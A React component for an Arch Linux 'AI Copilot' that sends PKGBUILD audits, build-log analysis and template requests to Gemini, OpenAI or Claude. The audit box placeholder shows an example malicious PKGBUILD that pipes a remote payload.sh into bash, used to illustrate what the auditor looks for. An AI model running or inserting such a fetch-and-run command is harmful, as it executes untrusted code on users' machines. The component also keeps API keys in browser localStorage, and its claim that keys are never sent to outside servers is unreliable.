import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Bot, Sparkles, Key, Check, Copy, Trash2, ShieldAlert, 
  HelpCircle, Code, Loader2, Send, Terminal, Cpu, Info, RefreshCw
} from "lucide-react";

interface Message {
  id: string;
  sender: "user" | "ai";
  text: string;
  timestamp: string;
  isAuditResult?: boolean;
}

export default function AICopilot() {
  const [geminiKey, setGeminiKey] = useState(() => localStorage.getItem("archforge-gemini-key") || "");
  const [anthropicKey, setAnthropicKey] = useState(() => localStorage.getItem("archforge-claude-key") || "");
  const [openaiKey, setOpenaiKey] = useState(() => localStorage.getItem("archforge-openai-key") || "");
  
  const [activeModel, setActiveModel] = useState<"gemini" | "claude" | "openai">(() => {
    return (localStorage.getItem("archforge-active-model") as any) || "gemini";
  });

  const [showKeys, setShowKeys] = useState(false);
  const [inputMessage, setInputMessage] = useState("");
  const [messages, setMessages] = useState<Message[]>([
    {
      id: "initial",
      sender: "ai",
      text: "Greetings, Commander. I am your ArchForge AI Copilot. I can audit PKGBUILD recipes for security, analyze container/host build failures, generate optimized package guides, and answer Arch administration questions. Configure your API keys below to unlock my advanced reasoning modules.",
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }
  ]);

  const [isLoading, setIsLoading] = useState(false);
  const [auditInput, setAuditInput] = useState("");
  const [activeTool, setActiveTool] = useState<"chat" | "audit" | "log-analyzer" | "generator">("chat");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  useEffect(() => {
    localStorage.setItem("archforge-gemini-key", geminiKey);
  }, [geminiKey]);

  useEffect(() => {
    localStorage.setItem("archforge-claude-key", anthropicKey);
  }, [anthropicKey]);

  useEffect(() => {
    localStorage.setItem("archforge-openai-key", openaiKey);
  }, [openaiKey]);

  useEffect(() => {
    localStorage.setItem("archforge-active-model", activeModel);
  }, [activeModel]);

  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages]);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const getActiveKey = () => {
    if (activeModel === "gemini") return geminiKey;
    if (activeModel === "claude") return anthropicKey;
    return openaiKey;
  };

  const executeAiCall = async (prompt: string, systemPrompt?: string) => {
    const key = getActiveKey();
    if (!key) {
      throw new Error(`Please provide a valid secret API key for ${activeModel.toUpperCase()} in the configuration panel.`);
    }

    if (activeModel === "gemini") {
      // Direct call to Gemini API using Google's generative language endpoints
      const response = await fetch(
        `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${key}`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            contents: [
              {
                role: "user",
                parts: [
                  { text: `${systemPrompt ? systemPrompt + "\n\n" : ""}User Request: ${prompt}` }
                ]
              }
            ],
            generationConfig: {
              temperature: 0.2,
              maxOutputTokens: 2048,
            }
          }),
        }
      );

      if (!response.ok) {
        const errJson = await response.json().catch(() => ({}));
        throw new Error(errJson?.error?.message || `Gemini API responded with status ${response.status}`);
      }

      const resJson = await response.json();
      const content = resJson?.candidates?.[0]?.content?.parts?.[0]?.text;
      if (!content) {
        throw new Error("No response generated from Gemini API model.");
      }
      return content;
    } 
    else if (activeModel === "openai") {
      const response = await fetch("https://api.openai.com/v1/chat/completions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${key}`
        },
        body: JSON.stringify({
          model: "gpt-4o-mini",
          messages: [
            ...(systemPrompt ? [{ role: "system", content: systemPrompt }] : []),
            { role: "user", content: prompt }
          ],
          temperature: 0.2
        })
      });

      if (!response.ok) {
        const errJson = await response.json().catch(() => ({}));
        throw new Error(errJson?.error?.message || `OpenAI API responded with status ${response.status}`);
      }

      const resJson = await response.json();
      const content = resJson?.choices?.[0]?.message?.content;
      if (!content) {
        throw new Error("No text choice returned from ChatGPT API.");
      }
      return content;
    }
    else {
      // Claude Anthropic logic
      // Note: Anthropic recommends using a proxy due to CORS restrictions on browser clients directly.
      // We perform direct fetch to API or provide fallback message
      const response = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-api-key": key,
          "anthropic-version": "2023-06-01",
          "dangerouslyAllowBrowser": "true" // Client authorization header bypass hint
        } as any,
        body: JSON.stringify({
          model: "claude-3-5-haiku-20241022",
          max_tokens: 2048,
          messages: [
            { role: "user", content: `${systemPrompt ? systemPrompt + "\n\n" : ""}Request: ${prompt}` }
          ],
          temperature: 0.2
        })
      });

      if (!response.ok) {
        const errJson = await response.json().catch(() => ({}));
        throw new Error(errJson?.error?.message || `Claude API responded with status ${response.status}. Cors headers block might require Gemini/OpenAI client usage.`);
      }

      const resJson = await response.json();
      const content = resJson?.content?.[0]?.text;
      if (!content) {
        throw new Error("No response body produced by Claude service.");
      }
      return content;
    }
  };

  const handleSendMessage = async (customPrompt?: string, sysPrompt?: string, label?: string) => {
    const textToSend = customPrompt || inputMessage;
    if (!textToSend.trim()) return;

    if (!customPrompt) {
      setInputMessage("");
    }

    const userMsgId = Math.random().toString();
    setMessages(prev => [...prev, {
      id: userMsgId,
      sender: "user",
      text: label || textToSend,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }]);

    setIsLoading(true);

    try {
      const activeKey = getActiveKey();
      if (!activeKey) {
        throw new Error(`No API key registered for your active model (${activeModel.toUpperCase()}). Please write one in the keys configuration bar.`);
      }

      const replyText = await executeAiCall(textToSend, sysPrompt);
      setMessages(prev => [...prev, {
        id: Math.random().toString(),
        sender: "ai",
        text: replyText,
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      }]);
    } catch (err: any) {
      setMessages(prev => [...prev, {
        id: Math.random().toString(),
        sender: "ai",
        text: `Error connecting to AI Provider (${activeModel.toUpperCase()}): ${err.message}`,
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        isAuditResult: true
      }]);
    } finally {
      setIsLoading(false);
    }
  };

  const runAudit = () => {
    if (!auditInput.trim()) return;
    const sysPrompt = "You are an elite Arch Linux Security Auditor. Analyze the provided PKGBUILD script file for malicious scripts, unauthorized internet connections during packaging, obfuscated base64 instructions, custom user privilege escalations, or backdoor endpoints. Give a high-level summary, list any suspicious commands found, and rate the safety score (Clean, Caution, Suspicious, Dangerous). Use a clean monospace formatting layout.";
    handleSendMessage(auditInput, sysPrompt, `Security Audit Request: PKGBUILD recipe analysis`);
    setAuditInput("");
  };

  const analyzeBuildLog = () => {
    if (!auditInput.trim()) return;
    const sysPrompt = "You are an expert Arch Linux makepkg / GCC compiler troubleshooter. Analyze the following compilation standard output stderr error log. Find the exact failure reason (missing header files, incorrect library file formats, compiler environment variable conflicts, or syntax error in source). Suggest specific terminal command lines or missing packages required to resolve the bug so compilation succeeds.";
    handleSendMessage(auditInput, sysPrompt, "Compile Error Analysis: makepkg build log troubleshoot");
    setAuditInput("");
  };

  const generatePkgbuildTemplate = () => {
    if (!auditInput.trim()) return;
    const sysPrompt = "You are a senior AUR maintainer. Generate a standard, fully compliant Pacman PKGBUILD configuration template file based on the requested software metadata descriptions, binary links, or libraries. Format it beautiful with standard fields, verify checksum blocks, and structure prep/build/package clauses clearly.";
    handleSendMessage(auditInput, sysPrompt, `PKGBUILD Template Request for "${auditInput}"`);
    setAuditInput("");
  };

  return (
    <div className="grid grid-cols-1 xl:grid-cols-4 gap-6 items-start">
      {/* Sidebar: keys configuring & Preset Utilities */}
      <div className="xl:col-span-1 space-y-6">
        {/* Keys Panel */}
        <div className="glass-panel border border-white/5 rounded-xl p-5 space-y-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Key className="h-4.5 w-4.5 text-cyan-400" />
              <h3 className="text-sm font-black font-mono text-white tracking-tight uppercase">AI Credentials</h3>
            </div>
            <button 
              onClick={() => setShowKeys(!showKeys)}
              className="text-[10px] text-cyan-400 font-mono hover:underline cursor-pointer"
            >
              {showKeys ? "COLLAPSE" : "CONFIGURE"}
            </button>
          </div>

          <div className="flex items-center gap-2 p-1.5 bg-zinc-900/40 rounded-lg border border-white/5">
            {(["gemini", "claude", "openai"] as const).map((m) => (
              <button
                key={m}
                onClick={() => setActiveModel(m)}
                className={`flex-1 text-center py-1 rounded text-[10px] font-mono font-bold capitalize cursor-pointer transition ${
                  activeModel === m 
                    ? "bg-cyan-500/10 text-cyan-400 border border-cyan-500/20" 
                    : "text-slate-400 hover:text-white"
                }`}
              >
                {m}
              </button>
            ))}
          </div>

          {(showKeys || !getActiveKey()) && (
            <motion.div 
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              className="space-y-3 pt-2 text-xs border-t border-white/5 overflow-hidden"
            >
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Gemini Api Key</label>
                <input 
                  type="password"
                  placeholder="Insert Gemini API Key"
                  value={geminiKey}
                  onChange={(e) => setGeminiKey(e.target.value)}
                  className="w-full bg-[#0a0d13] border border-white/10 rounded-lg text-white font-mono px-3 py-1.5 focus:border-cyan-400 focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Anthropic Claude Key</label>
                <input 
                  type="password"
                  placeholder="Insert Claude API Key"
                  value={anthropicKey}
                  onChange={(e) => setAnthropicKey(e.target.value)}
                  className="w-full bg-[#0a0d13] border border-white/10 rounded-lg text-white font-mono px-3 py-1.5 focus:border-cyan-400 focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">ChatGPT OpenAI Key</label>
                <input 
                  type="password"
                  placeholder="Insert OpenAI API Key"
                  value={openaiKey}
                  onChange={(e) => setOpenaiKey(e.target.value)}
                  className="w-full bg-[#0a0d13] border border-white/10 rounded-lg text-white font-mono px-3 py-1.5 focus:border-cyan-400 focus:outline-none"
                />
              </div>
              
              <div className="p-2.5 rounded bg-zinc-950/40 text-[10px] text-slate-400 font-sans border border-white/5 flex gap-1.5 leading-normal">
                <Info className="h-3.5 w-3.5 text-cyan-400 shrink-0 mt-0.5" />
                <span>Credentials are persisted safely in your immediate browser Sandbox local storage and never beamed to outside servers.</span>
              </div>
            </motion.div>
          )}

          {!showKeys && getActiveKey() && (
            <div className="flex items-center justify-between text-[11px] bg-emerald-500/5 border border-emerald-500/20 text-emerald-400 rounded-lg p-2 font-mono">
              <span className="flex items-center gap-1.5">
                <Check className="h-3 w-3 stroke-[3]" />
                Key Loaded
              </span>
              <span className="opacity-60">{activeModel.toUpperCase()} active</span>
            </div>
          )}
        </div>

        {/* Copilot Task-Focused presets */}
        <div className="glass-panel border border-white/5 rounded-xl p-5 space-y-4">
          <div className="flex items-center gap-2">
            <Cpu className="h-4.5 w-4.5 text-cyan-400" />
            <h3 className="text-sm font-black font-mono text-white tracking-tight uppercase">Audit Modules</h3>
          </div>
          <p className="text-[11px] text-slate-400">
            Select an specialty reasoning module on the right or choose a preset action below.
          </p>

          <div className="flex flex-col gap-2 pt-1">
            <button
              onClick={() => { setActiveTool("audit"); }}
              className={`w-full text-left p-3 rounded-lg border text-xs cursor-pointer transition flex items-center gap-2.5 ${
                activeTool === "audit" 
                  ? "bg-cyan-500/10 border-cyan-500/30 text-teal-300" 
                  : "bg-zinc-900/15 border-white/5 text-slate-300 hover:bg-white/5 hover:text-white"
              }`}
            >
              <ShieldAlert className="h-4 w-4 text-cyan-400 shrink-0" />
              <div>
                <div className="font-bold font-mono text-[11px]">PKGBUILD Security Auditor</div>
                <div className="text-[9px] text-slate-400">Scan recipes for malicious shell hooks</div>
              </div>
            </button>

            <button
              onClick={() => { setActiveTool("log-analyzer"); }}
              className={`w-full text-left p-3 rounded-lg border text-xs cursor-pointer transition flex items-center gap-2.5 ${
                activeTool === "log-analyzer" 
                  ? "bg-cyan-500/10 border-cyan-500/30 text-teal-300" 
                  : "bg-zinc-900/15 border-white/5 text-slate-300 hover:bg-white/5 hover:text-white"
              }`}
            >
              <Terminal className="h-4 w-4 text-cyan-400 shrink-0" />
              <div>
                <div className="font-bold font-mono text-[11px]">Compile Error Troubleshooter</div>
                <div className="text-[9px] text-slate-400">Fix compiler headers and missing libs</div>
              </div>
            </button>

            <button
              onClick={() => { setActiveTool("generator"); }}
              className={`w-full text-left p-3 rounded-lg border text-xs cursor-pointer transition flex items-center gap-2.5 ${
                activeTool === "generator" 
                  ? "bg-cyan-500/10 border-cyan-500/30 text-teal-300" 
                  : "bg-zinc-900/15 border-white/5 text-slate-300 hover:bg-white/5 hover:text-white"
              }`}
            >
              <Code className="h-4 w-4 text-cyan-400 shrink-0" />
              <div>
                <div className="font-bold font-mono text-[11px]">PKGBUILD Recipe Creator</div>
                <div className="text-[9px] text-slate-400">Generate clean package manifests</div>
              </div>
            </button>
            
            <button
              onClick={() => { setActiveTool("chat"); }}
              className={`w-full text-left p-3 rounded-lg border text-xs cursor-pointer transition flex items-center gap-2.5 ${
                activeTool === "chat" 
                  ? "bg-cyan-500/10 border-cyan-500/30 text-teal-300" 
                  : "bg-zinc-900/15 border-white/5 text-slate-300 hover:bg-white/5 hover:text-white"
              }`}
            >
              <Bot className="h-4 w-4 text-cyan-400 shrink-0" />
              <div>
                <div className="font-bold font-mono text-[11px]">Arch Linux Chat Assistant</div>
                <div className="text-[9px] text-slate-400">Consult general sysadmin troubleshooting</div>
              </div>
            </button>
          </div>
        </div>
      </div>

      {/* Main Panel: Interactive playground */}
      <div className="xl:col-span-3 glass-panel border border-white/10 rounded-xl p-6.5 min-h-[580px] flex flex-col justify-between">
        
        {/* Module Header */}
        <div className="flex items-center justify-between border-b border-white/5 pb-4.5 mb-4.5 shrink-0">
          <div className="flex items-center gap-3">
            <div className="h-9 w-9 rounded-lg bg-cyan-950/60 border border-cyan-500/20 flex items-center justify-center text-cyan-400">
              {activeTool === "chat" && <Bot className="h-5 w-5" />}
              {activeTool === "audit" && <ShieldAlert className="h-5 w-5" />}
              {activeTool === "log-analyzer" && <Terminal className="h-5 w-5" />}
              {activeTool === "generator" && <Code className="h-5 w-5" />}
            </div>
            <div>
              <h2 className="text-sm font-black font-mono text-white tracking-tight uppercase">
                {activeTool === "chat" && "Arch Linux Maintenance Chat Assistant"}
                {activeTool === "audit" && "AUR PKGBUILD Recipe Security Auditor"}
                {activeTool === "log-analyzer" && "Compile Error & GCC Header Troubleshooter"}
                {activeTool === "generator" && "AUR PKGBUILD Target Maker"}
              </h2>
              <p className="text-[11px] text-slate-400 font-sans">
                {activeTool === "chat" && "General chat consultant. Discuss dependencies, dynamic library errors and sysadmin advice."}
                {activeTool === "audit" && "Deep static analysis of target AUR bash scripts, checking for backdoors or suspicious curl loops."}
                {activeTool === "log-analyzer" && "Input bad gcc, g++, clang, or ld linker error output logs to instantly discover fixes."}
                {activeTool === "generator" && "Input a program name, license, source website url, and description to compile a standard template."}
              </p>
            </div>
          </div>
          
          <button 
            onClick={() => setMessages([
              {
                id: "initial",
                sender: "ai",
                text: "Session restarted. Ask me how to audit your packages, analyze compiler errors, or keep your Arch Linux platform secured.",
                timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
              }
            ])}
            className="flex items-center gap-1.5 border border-white/5 hover:border-white/15 px-2.5 py-1.5 rounded-lg text-[10px] text-slate-400 font-mono hover:text-white transition cursor-pointer"
            title="Clear Chat Stream"
          >
            <RefreshCw className="h-3 w-3" />
            CLEAR
          </button>
        </div>

        {/* Audit/Log-analyzer Inputs */}
        {activeTool !== "chat" && (
          <div className="mb-4 space-y-2 shrink-0 animate-fadeIn">
            <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between uppercase">
              <span>
                {activeTool === "audit" && "Paste PKGBUILD Content Details:"}
                {activeTool === "log-analyzer" && "Paste Compiler stderr Log:"}
                {activeTool === "generator" && "Describe target software metadata:"}
              </span>
              <span className="text-[9px] lowercase opacity-60">
                {activeTool === "audit" && "Static analysis scan"}
                {activeTool === "log-analyzer" && "Compiler output trace"}
                {activeTool === "generator" && "Example: google-chrome stable version 120 license proprietary"}
              </span>
            </div>
            
            <div className="relative">
              <textarea
                value={auditInput}
                onChange={(e) => setAuditInput(e.target.value)}
                placeholder={
                  activeTool === "audit" 
                    ? "pkgname=evilaur\npkgver=1.0.0\nprepare() {\n  curl -s http://unverified-site.io/payload.sh | bash\n}\n..."
                    : activeTool === "log-analyzer"
                      ? "In file included from main.cpp:2:\n/usr/include/X11/Xlib.h:35: fatal error: X11/Xlib-xcb.h: No such file or directory\ncompilation terminated."
                      : "Package name: mycustom-app\nVersion: 2.1.4\nDescription: A lightning-fast rust daemon for background file syncing\nSource tarball: https://github.com/myuser/myapp/releases/download/v2.1.4/myapp.tar.gz"
                }
                rows={4}
                className="w-full bg-[#07090d] border border-white/10 rounded-xl font-mono text-xs text-slate-200 px-3.5 py-3 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/20"
              />
              
              <button
                onClick={
                  activeTool === "audit" 
                    ? runAudit 
                    : activeTool === "log-analyzer" 
                      ? analyzeBuildLog 
                      : generatePkgbuildTemplate
                }
                disabled={isLoading || !auditInput.trim()}
                className="absolute right-3.5 bottom-3.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 disabled:hover:bg-cyan-500 transition px-3.5 py-1.5 text-[10px] font-bold font-mono text-zinc-950 flex items-center gap-1.5 cursor-pointer"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="h-3 w-3 animate-spin" />
                    RUNNING...
                  </>
                ) : (
                  <>
                    <Sparkles className="h-3 w-3" />
                    {activeTool === "audit" && "ANALYZE SCRIPT"}
                    {activeTool === "log-analyzer" && "SOLVE ERRORS"}
                    {activeTool === "generator" && "CREATE PKGBUILD"}
                  </>
                )}
              </button>
            </div>
          </div>
        )}

        {/* Messaging Area */}
        <div className="flex-1 bg-[#06080c]/50 border border-white/5 rounded-xl p-4.5 min-h-[300px] max-h-[460px] overflow-y-auto space-y-4 font-sans text-xs">
          <AnimatePresence initial={false}>
            {messages.map((msg) => (
              <div 
                key={msg.id}
                className={`flex gap-3 max-w-[85%] ${msg.sender === "user" ? "ml-auto flex-row-reverse" : ""}`}
              >
                {/* Avatar */}
                <div className={`h-8 w-8 rounded-lg shrink-0 flex items-center justify-center border font-bold text-xs ${
                  msg.sender === "user" 
                    ? "bg-cyan-950/40 border-cyan-500/25 text-cyan-400" 
                    : "bg-zinc-900 border-white/10 text-slate-300"
                }`}>
                  {msg.sender === "user" ? "U" : <Bot className="h-4 w-4" />}
                </div>

                {/* Bubble */}
                <div className="space-y-1">
                  <div className={`rounded-xl px-4 py-3 border whitespace-pre-wrap leading-relaxed ${
                    msg.sender === "user" 
                      ? "bg-cyan-500/5 border-cyan-500/25 text-slate-200" 
                      : msg.isAuditResult 
                        ? "bg-rose-950/15 border-rose-900/35 text-rose-300"
                        : "bg-zinc-900/40 border-white/5 text-slate-300 font-mono"
                  }`}>
                    {msg.text}
                  </div>
                  
                  {/* Timestamp & copy buttons */}
                  <div className={`flex items-center gap-3 text-[9px] text-slate-500 font-mono ${
                    msg.sender === "user" ? "justify-end" : ""
                  }`}>
                    <span>{msg.timestamp}</span>
                    {msg.sender === "ai" && (
                      <button
                        onClick={() => handleCopy(msg.text, msg.id)}
                        className="hover:text-cyan-400 transition cursor-pointer flex items-center gap-1"
                        title="Copy text to clipboard"
                      >
                        {copiedId === msg.id ? (
                          <>
                            <Check className="h-2.5 w-2.5 text-emerald-400 stroke-[3]" />
                            <span className="text-emerald-400">Copied</span>
                          </>
                        ) : (
                          <>
                            <Copy className="h-2.5 w-2.5" />
                            <span>Copy</span>
                          </>
                        )}
                      </button>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </AnimatePresence>
          <div ref={messagesEndRef} />
        </div>

        {/* Direct Chat Input Pane */}
        {activeTool === "chat" && (
          <div className="flex gap-2 mt-4 shrink-0">
            <input
              type="text"
              placeholder={
                isLoading 
                  ? "ArchForge Copilot is analyzing..." 
                  : "Ask about package installations, fixing dependencies, orphans scan, gpg signature issues..."
              }
              value={inputMessage}
              onChange={(e) => setInputMessage(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter" && !isLoading) {
                  handleSendMessage();
                }
              }}
              disabled={isLoading}
              className="flex-1 bg-[#07090d] border border-white/10 rounded-xl px-4 py-3 text-xs text-slate-200 font-sans focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/20 disabled:opacity-50"
            />
            
            <button
              onClick={() => handleSendMessage()}
              disabled={isLoading || !inputMessage.trim()}
              className="rounded-xl bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 disabled:hover:bg-cyan-500 px-5.5 transition-all text-zinc-950 font-black tracking-wider text-xs flex items-center gap-2 cursor-pointer shadow-md shadow-cyan-500/10"
            >
              {isLoading ? (
                <Loader2 className="h-4 w-4 animate-spin text-zinc-950" />
              ) : (
                <>
                  <Send className="h-4 w-4 text-zinc-950" />
                  <span>SEND</span>
                </>
              )}
            </button>
          </div>
        )}

      </div>
    </div>
  );
}
